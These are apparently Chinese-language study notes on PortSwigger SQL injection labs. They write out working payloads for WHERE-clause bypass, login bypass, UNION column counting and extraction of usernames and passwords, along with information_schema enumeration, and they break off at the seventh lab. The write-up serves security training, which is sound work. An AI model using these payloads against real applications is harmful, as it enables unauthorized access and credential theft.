## 1、where子句中的sql注入漏洞允许检索隐藏数据

给的提示：

![image-20250327214319103](assets/image-20250327214319103.png)

当选择一个商品类别，抓包显示：

![image-20250327214615189](assets/image-20250327214615189.png)

他执行的语句是：select * from products where category = 'Pets' and released = 1

所以我们可以构造payload：

Pets'+or+1=1-- 

拼接完就是：

select * from products where category = 'Pets'+or+1=1-- and released = 1

![image-20250327214957717](assets/image-20250327214957717.png)

这样就查出了没有发布的商品



## 2、允许绕过登录的 SQL 注入漏洞

登录框输入administrator‘--

单引号用来闭合 -- 用来注释后面的语句



## 3、SQL 注入 UNION 攻击，确定查询返回的列数

这一关规定是通过union来确定返回的列数，也就是确定products表有几列

因为union前后必须是一致的，意思是说：

`select username, password from user union select NULL, NULL` 语法是正确的

而 `select username, password from user union select NULL, NULL, NULL` 是不正确的

也就是说，union前面的语句搜的是两列，那么union后面的语句也要搜两列 

**为什么用NULL？** 

​	因为两个select语句对应列所返回的数据类型必须是相同或者是兼容的，`NULL` 可转换为每种常见数据类型，因此当列数正确时，它可以最大限度地提高有效载荷成功的机会。



所以抓一个包，尝试一下：

`GET /filter?category=Pets'+union+select+NULL,+NULL,+NULL-- HTTP/2`

正确，说明是3列



跳出本关的规则，除了使用UNION来判断列数，还可以用order by

`/filter?category=Pets'+order+by+4--` 报错

`/filter?category=Pets'+order+by+3--` 正确

说明是3列



该靶场提示：在oracle中，每个 `SELECT` 查询都必须使用 `FROM` 关键字并指定一个有效的表。Oracle 上有一个名为 `dual` 内置表可用于此目的。因此，Oracle 上的注入查询需要如下所示：

`' UNION SELECT NULL FROM DUAL--`



因为union前后的查询结果对应列的数据类型必须相同或兼容，因此可以利用这个来判断哪一列是字符串（有价值的数据一般以字符串格式存储）

例如：

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```



## 4、SQL injection UNION attack, retrieving data from other tables

题目中说了有一个user表，表中有username和password字段

首先加一个单引号，看看反应

```
GET /filter?category=Gifts' HTTP/2
```

![image-20250626185921305](assets/image-20250626185921305.png)

加两个单引号：

![image-20250626185951718](assets/image-20250626185951718.png)

判断是字符型注入

通过order by判断表的列数

```
GET /filter?category=Gifts'%20order%20by%203%20--+ HTTP/2
```

到3的时候页面出错，说明这个表有两列

判断该表的列数是因为union前后查询的列数必须保持一致，而且对应列的数据类型必须相同

判断回显位：

一开始用的是：

```
Gifts' union select 1,2--+
```

报错，用这种才行：

```
Gifts' union select 'awwwwww','bsssssssss'--+
```

![image-20250626191930298](assets/image-20250626191930298.png)

```
Gifts' union select username, password from users--+
```

![image-20250626192213837](D:/typora/%E7%AC%94%E8%AE%B0/PortSwigger%E9%9D%B6%E5%9C%BA/assets/image-20250626192213837.png)

同administrator账号登陆之后就算过关了

![image-20250626192338577](assets/image-20250626192338577.png)

## 5、SQL injection UNION attack, retrieving multiple values in a single column

字符型注入

表中有两列（用order by判断）

上面的这两个不再赘述

这一关有了变化：

![image-20250626235703516](assets/image-20250626235703516.png)

还是之前说的：union前后查询的列数必须保持一致，而且对应列的数据类型必须相同。

如果你填：

```
Gifts' union select 2,1--+
```

或者：

```
Gifts' union select 'aaaaaaaaaaaaaaaa','bbbbbbbbbbbbbb'--+
```

都不行



进一步利用一下：

```
Gifts' union select 1,version()--+
```

![image-20250627000156299](assets/image-20250627000156299.png)

从题目以及描述中看，这一关是让我们从同一列中批量提取数据，因为之前的关卡中都是每一列只能查询到一个数据

不同的数据库使用不同的语法来执行字符串连接，参考SQL注入速查表：

[SQL注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet)

<img src="assets/image-20250627000349470.png" alt="image-20250627000349470" style="zoom: 67%;" />

所以这样构造：

```
Gifts' union select 1, username || password from users--+
```

![image-20250627000853772](assets/image-20250627000853772.png)

看不清，搞一个分隔符

```
Gifts' union select 1, username || '~' || password from users--+
```

![image-20250627001043143](assets/image-20250627001043143.png)

## 6、SQL injection attack, querying the database type and version on MySQL and Microsoft

查数据库版本，根据数据库的不同 语法也不同

| Microsoft, MySQL | `SELECT @@version`        |
| ---------------- | ------------------------- |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

## 7、SQL injection attack, listing the database contents on non-Oracle databases

它给的知识：

多数数据库（除了Oracle）都有一个叫做information schema的东西，它提供有关数据库的信息。

我们可以查询 `information_schema.tables` 来列出数据库中的表：

```
SELECT * FROM information_schema.tables
```

返回如下：

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

此输出表明有三个表，分别称为 `Products` 、 `Users` 和 `Feedback` 。

然后可以查询 `information_schema.columns` 来列出各个表中的列

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

返回如下：

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```



例如，Mysql数据库中有一个information_schema数据库，里面有一个SCHEMATA表，存储了所有的数据库名

![image-20250627002522607](assets/image-20250627002522607.png)

该数据库下的TABLES表中存储了哪个数据库对应哪些表

<img src="assets/image-20250627002657569.png" alt="image-20250627002657569" style="zoom:67%;" />

那就是说我们sql注入的时候不需要去猜数据库名表明列名，我们通过information_schema数据库很清晰地查有哪些数据库、有哪些表、字段



来到这一关

